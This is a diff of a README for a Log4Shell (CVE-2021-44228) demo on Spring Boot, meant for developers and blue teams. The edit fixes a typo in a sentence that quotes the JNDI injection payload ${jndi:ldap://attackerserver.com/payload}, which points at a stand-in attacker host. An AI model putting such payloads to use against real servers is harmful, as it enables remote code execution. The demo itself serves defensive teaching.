@@ -3,7 +3,7 @@ Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features u
 
 Spring Boot is using logback by default.  It is also supporting the use of log4j2 and hance it's exposed to this vulnerability if not patched.
 
-**Hacking is illegal!** The purpose of this demo is for developers/blue team member to understanding how older version of log4j2 is being exploitted and how to patch it.  Instead of using ${jndi:ldap://attacherserver.com/payload} as payload, we display the OS version instead in this demo.  
+**Hacking is illegal!** The purpose of this demo is for developers/blue team member to understanding how older version of log4j2 is being exploitted and how to patch it.  Instead of using ${jndi:ldap://attackerserver.com/payload} as payload, we display the OS version instead in this demo.  
 
 ## Create a New Maven Demo Project for Log4Shell(CVE-2021-44228)
 ### 1. Create an empty project using Spring CLI
